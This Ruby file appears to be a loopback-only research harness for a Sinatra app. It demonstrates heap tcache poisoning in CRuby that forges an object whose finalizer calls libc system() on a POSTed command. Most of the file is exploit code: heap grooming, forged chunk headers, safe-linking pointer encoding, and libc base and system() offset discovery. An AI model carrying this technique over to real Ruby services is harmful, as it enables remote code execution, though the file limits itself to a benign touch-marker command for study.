# Ruby2Shell rung-5 experiment: Stage C HTTP tcache poisoning -> T_DATA
# finalizer -> libc system(command). Loopback only.
#
# The trigger and heap geometry are the committed Stage C HTTP chain. The
# second poisoned pop copies a 1000-byte payload into a 640-byte VWA slot,
# forging an untyped RData whose dfree(data) is system(command). The command
# is carried in this request's multipart `cmd` field and copied into f_host.
# ObjectSpace.dump and /proc/self/maps are lab address-discovery mechanisms;
# mtrace.so remains required for heap address discovery and safe-linking.
gem 'sinatra', '4.2.2'
gem 'rack', '3.2.8'
gem 'rackup', '2.3.1'
gem 'webrick', '1.9.2'
require 'sinatra'
require 'objspace'
require 'json'

$control = !ENV['RUBY2SHELL_R5_CONTROL'].nil?
$trace_path = ENV['RUBY2SHELL_R5_TRACE']
$marker_path = ENV['RUBY2SHELL_R5_MARKER']
raise 'RUBY2SHELL_R5_TRACE not set' unless $trace_path
raise 'RUBY2SHELL_R5_MARKER not set' unless $marker_path
raise 'marker must be under lab/build/evidence' unless
  $marker_path.start_with?(File.expand_path('../build/evidence', __dir__) + '/')
$trace_io = (ENV['MTRACE_FD'] && ENV['MTRACE_FD'] != '2') ? IO.for_fd(ENV['MTRACE_FD'].to_i, autoclose: false) : nil

$result = 'not-yet'
$f_host = nil
$t_content = nil
$drains = nil
$forged = nil
$target = nil
$v_addr = nil
$t_entry = nil
$ov = nil
$z1 = nil
$z2 = nil
$victims = nil
$payload = nil
$command = nil
$victim_addr = nil
$victim_klass = nil
$f_host_addr = nil
$system_addr = nil
$marker2_path = ENV['RUBY2SHELL_R5_MARKER2']
$this_marker = nil
$t_prev_orig = nil
$t_size_orig = nil
$repair = !ENV['RUBY2SHELL_R5_REPAIR'].nil?

$memio = File.open('/proc/self/mem', 'r+b')

def r64(addr)
  bytes = $memio.pread(8, addr)
  raise "short mem read at #{addr.to_s(16)}" unless bytes && bytes.bytesize == 8
  bytes.unpack1('Q<')
end

def w64(addr, value)
  n = $memio.pwrite([value].pack('Q<'), addr)
  raise "short mem write at #{addr.to_s(16)}" unless n == 8
end

# Host-measured on Ubuntu GLIBC 2.39-0ubuntu8.12:
# ctypes.CDLL(None).system - libc mapping with file offset 0 = 0x58750.
SYSTEM_OFFSET = 0x58750
VICTIM_SLOT_SIZE = 640
PAYLOAD_SIZE = 1000

def marker(s)
  STDERR.write(s)
  STDERR.flush
  return unless $trace_io
  $trace_io.write(s)
  $trace_io.flush
end

class GroomMiddleware
  def initialize(app)
    @app = app
  end

  def scrub
    nil
  end

  def prepare_victims!
    # A 615-byte String occupies a 640-byte VWA slot and embeds through the
    # slot's final byte. The final qword of the lower-address neighbor is
    # therefore target-8. IS_MMAPPED makes malloc_usable_size use only this
    # qword, avoiding a next-chunk read outside the Ruby slot page.
    fake_mmapped_size = [0x3f3, 0x3f3].pack('Q<Q<')
    $victims = Array.new(12) do
      s = 'G' * 615
      s[-16, 16] = fake_mmapped_size
      s
    end
    dumps = $victims.map { |v| JSON.parse(ObjectSpace.dump(v)) }
    addresses = dumps.map { |d| d['address'].to_i(16) }
    raise 'unexpected VWA slot size' unless dumps.all? { |d|
      d['slot_size'] == VICTIM_SLOT_SIZE && d['embedded']
    }
    # CRuby allocates these slots downward. Select a measured contiguous
    # triple: the lower neighbor supplies target-8; the upper neighbor is
    # made inert for GC. Other VWA allocations can separate the first slots.
    victim_index = (1...(addresses.length - 1)).find do |i|
      addresses[i - 1] == addresses[i] + VICTIM_SLOT_SIZE &&
        addresses[i + 1] == addresses[i] - VICTIM_SLOT_SIZE
    end
    marker("victim-slots=#{addresses.map { |a| format('%#x', a) }.join(',')}\n")
    raise 'no contiguous victim triple' unless victim_index
    $victim_addr = addresses[victim_index]
    $victim_klass = dumps[victim_index]['class'].to_i(16)
    marker("victim=0x#{$victim_addr.to_s(16)} klass=0x#{$victim_klass.to_s(16)}\n")
  end

  def discover_system!
    line = File.foreach('/proc/self/maps').find do |entry|
      fields = entry.split
      fields[2] == '00000000' && entry.match?(%r{/lib/x86_64-linux-gnu/libc\.so\.6})
    end
    raise 'libc base not found' unless line
    libc_base = line.split('-', 2).first.to_i(16)
    $system_addr = libc_base + SYSTEM_OFFSET
    marker("system=0x#{$system_addr.to_s(16)}\n")
  end

  def groom!(env)
    request = Rack::Request.new(env)
    params = request.POST
    $command = params.fetch('cmd').to_s.b
    expected = "/usr/bin/touch #{$marker_path}"
    expected2 = $marker2_path ? "/usr/bin/touch #{$marker2_path}" : nil
    raise 'command is not the authorized benign marker command' unless
      $command == expected || $command == expected2
    raise 'command too long' unless $command.bytesize < 4000
    $this_marker = ($command == expected2 && expected2) ? $marker2_path : $marker_path

    prepare_victims!
    discover_system!

    GC.start
    $drains = [
      Array.new(512) { 'e' * 840 },
      Array.new(512) { 'd' * 856 },
      Array.new(512) { 't' * 1000 },
      Array.new(512) { 'v' * 1048 },
      Array.new(512) { 'w' * 1096 },
    ]
    $t_content = ('W' * 16) +
                 "\x50\x04\x00\x00\x00\x00\x00\x00" +
                 "\x90\x00\x00\x00\x00\x00\x00\x00" +
                 ('A' * 968)
    raise 'bad T content' unless $t_content.bytesize == 1000

    marker("===ALLOC===\n")
    s_chunk = 'd' * 856
    v_chunk = 'v' * 1048
    t_live  = $t_content + ''
    a_chunk = 'q' * 1000
    dummy   = 'e' * 840
    $f_host = $command + "\0" + ('F' * (4000 - $command.bytesize - 1))

    $trace_io.flush if $trace_io
    $v_addr = nil
    $f_host_addr = nil
    # mtrace appends continuously, so a growing File.foreach would never
    # finish. Read a fixed-size tail snapshot; the last matches are the
    # current request's V and command allocations even on a second POST.
    size = File.size($trace_path)
    window = size > 2_000_000 ? 2_000_000 : size
    tail = File.open($trace_path, 'rb') do |f|
      f.seek(size - window)
      f.read(window)
    end
    tail.each_line do |line|
      $v_addr = $1.to_i(16) if line =~ /\AM \d+ 419 ([0-9a-f]+)/
      $f_host_addr = $1.to_i(16) if line =~ /\AM \d+ fa1 ([0-9a-f]+)/
    end
    raise 'trace parse failed' unless $v_addr && $f_host_addr

    $t_entry = $v_addr + 0x430
    # Capture T's real header before the harness forges it. The 0x3f1
    # downgrade of the 0x405 size field is what makes a later free abort.
    $t_prev_orig = r64($t_entry - 0x10)
    $t_size_orig = r64($t_entry - 8)
    marker("T-hdr-prev=0x#{$t_prev_orig.to_s(16)} size=0x#{$t_size_orig.to_s(16)}\n")
    $target = $victim_addr & ~0xf
    $victim_shift = $victim_addr - $target
    raise 'bad victim shift' unless [0, 8].include?($victim_shift)
    $forged = [$target ^ ($t_entry >> 12)].pack('Q<')
    marker("V-addr=0x#{$v_addr.to_s(16)}\n")
    marker("T-entry=0x#{$t_entry.to_s(16)}\n")
    marker("target=0x#{$target.to_s(16)} command=0x#{$f_host_addr.to_s(16)}\n")

    # First slot: untyped RData, dfree=system and data=f_host (command at
    # offset 0, followed by NUL). Upper neighboring slot at payload+640: inert
    # untyped RData with data=NULL, safe for the same GC sweep. Remaining
    # bytes in each 640-byte slot are zero and are not object headers.
    rdata = [0x0c, $victim_klass, 0, $system_addr, $f_host_addr].pack('Q<5')
    inert = [0x0c, $victim_klass, 0, 0, 0].pack('Q<5')
    $payload = ("\0" * $victim_shift) + rdata + ("\0" * 600) +
               inert + ("\0" * (320 - $victim_shift))
    raise 'bad payload size' unless $payload.bytesize == PAYLOAD_SIZE

    marker("===FREE===\n")
    s_chunk = nil; v_chunk = nil; t_live = nil; a_chunk = nil; dummy = nil
    scrub; scrub; scrub
    GC.start
    GC.disable
  end

  def call(env)
    groom!(env) if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
    @app.call(env)
  end
end

class MarkerMiddleware
  def initialize(app)
    @app = app
  end

  def scrub
    nil
  end

  def call(env)
    if env['REQUEST_METHOD'] == 'POST' && env['PATH_INFO'] == '/trigger'
      marker("===MARK===\n")
      $ov = 'm' * 1080
      $ov.force_encoding(Encoding::ASCII_8BIT)
      $ov[1072, 8] = $forged
      $ov[1056, 16] = [0x450, 0x3f1].pack('Q<Q<')

      marker("===POPS===\n")
      marker("forged-hex=#{$forged.unpack1('H*')}\n")
      $z1 = 'z' * 1000
      $z2 = $payload + '' # poisoned pop2: fresh 1001-byte malloc + chosen copy

      # Drop every Ruby reference to the original VWA objects. Keep ov/z1/z2
      # live so their corrupted malloc chunks are not freed before the call.
      $victims = nil
      scrub; scrub; scrub
      GC.enable
      GC.start
      GC.start unless File.file?($this_marker)
      observed = File.file?($this_marker)
      if $repair && observed
        w64($t_entry - 0x10, $t_prev_orig)
        w64($t_entry - 8, $t_size_orig)
        w64($t_entry, 0)
        w64($target + 0x18, 0)
        marker("repair=T-header-restored dfree-cleared\n")
      end
      $result = "target=0x#{$target.to_s(16)} system=0x#{$system_addr.to_s(16)} " \
                "rce=#{observed ? 'OBSERVED' : 'ABSENT'} control=#{$control}"
      marker("#{$result}\n")
      if ENV['RUBY2SHELL_R5_STOP']
        marker("===STOPPED===\n")
        Process.kill('SIGSTOP', Process.pid)
      end
    end
    @app.call(env)
  end
end

use MarkerMiddleware
set :show_exceptions, false

before { content_type 'text/plain' }

post '/trigger' do
  "triggered #{$result}\n"
end

get '/health' do
  "ready\n"
end

require 'rackup/handler/webrick'
Sinatra::Application.set(:run, false)
app = GroomMiddleware.new(Sinatra::Application.new)
Rackup::Handler::WEBrick.run(app, Host: '127.0.0.1', Port: 4549)
